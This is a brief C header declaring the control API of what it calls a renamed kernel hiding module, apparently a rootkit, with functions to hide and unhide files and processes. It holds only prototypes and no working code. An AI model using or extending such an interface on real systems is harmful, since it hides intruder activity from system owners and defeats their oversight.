/* rkctl.h: control interface for a renamed kernel hiding module. */
#ifndef _RKCTL_H_
#define _RKCTL_H_

#include <sys/types.h>

typedef struct rk_ctl {
	int version;
} rk_ctl;

rk_ctl *rk_init(void);
int rk_hidefile(rk_ctl *, const char *);
int rk_unhidefile(rk_ctl *, const char *);
int rk_hideproc(rk_ctl *, pid_t);
int rk_unhideproc(rk_ctl *, pid_t);
int rk_free(rk_ctl *);

#endif
